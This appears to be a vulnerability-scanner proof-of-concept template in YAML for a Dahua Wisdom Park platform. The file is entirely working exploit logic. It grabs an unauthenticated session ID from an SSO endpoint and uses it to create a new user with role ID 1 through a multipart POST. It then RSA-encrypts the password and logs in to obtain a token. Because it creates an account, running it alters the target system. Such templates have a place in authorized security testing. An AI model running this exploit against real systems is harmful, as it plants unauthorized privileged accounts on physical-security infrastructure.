name: poc-yaml-dahua-sso_initSession_action-create_user
transport: http
detail:
  cpe: dahuatech:dahua_wisdom_park
  version: '{{version}}'
  links: [ "https://stack.chaitin.com/techblog/detail?id=103" ]
set:
  rboundary: randomLowercase(8)
  username: randomLowercase(8)
  password: randomLowercase(8)
rules:
  r0:
    request:
      method: GET
      path: /admin/sso_initSession.action
    expression: |
      "[0-9a-zA-Z]{32}".matches(response.body_string) && response.headers["content-length"] == "32"
    output:
      search: |
        '(?P<sid>[0-9a-zA-Z]{32})'.submatch(response.body_string)
      sid: search['sid']

  r1:
    request:
      method: POST
      path: /admin/user_save.action
      headers:
        Cookie: JSESSIONID={{sid}}
        Content-Type: multipart/form-data; boundary=----{{rboundary}}
      body: "------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.userType\"\r\n\
            \r\n\
            0\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.ownerCode\"\r\n\
            \r\n\
            001\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.isReuse\"\r\n\
            \r\n\
            0\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.macStat\"\r\n\
            \r\n\
            0\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.roleIds\"\r\n\
            \r\n\
            1\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.loginName\"\r\n\
            \r\n\
            {{username}}\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"displayedOrgName\"\r\n\
            \r\n\
            {{username}}\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.loginPass\"\r\n\
            \r\n\
            {{password}}\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"checkPass\"\r\n\
            \r\n\
            {{password}}\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.groupId\"\r\n\
            \r\n\
            0\r\n\
            ------{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"userBean.userName\"\r\n\
            \r\n\
            {{username}}\r\n\
            ------{{rboundary}}--"
    expression: response.body_string.contains('validationError:::用户名称已存在:::validationError') || (response.status == 200 && response.headers['content-length'] == "0")

  r2:
    request:
      method: POST
      path: /WPMS/getPublicKey
      headers:
        Content-Type: application/json
      body: |
        {"loginName":"{{username}}"}
    expression: response.body_string.contains('"publicKey":')
    output:
      search: |
        '"publicKey":"(?P<pubkey>.*?)"'.submatch(response.body_string)
      pubkey: search['pubkey']
      enc_password: base64(rsaEncryptPKCS1v15(bytes(password),pubkey))

  r3:
    request:
      method: POST
      path: /WPMS/login
      headers:
        Content-Type: application/json
      body: |
        {"loginName":"{{username}}","loginPass":"{{enc_password}}","timestamp":"16853622671401904168273612873678126378126387"}
    expression: response.body_string.contains('"success":"true"')
    output:
      search: |
        '"token":"(?P<token>.*?)"'.submatch(response.body_string)
      token: search['token']

expression: r0() && r1() && r2() && r3()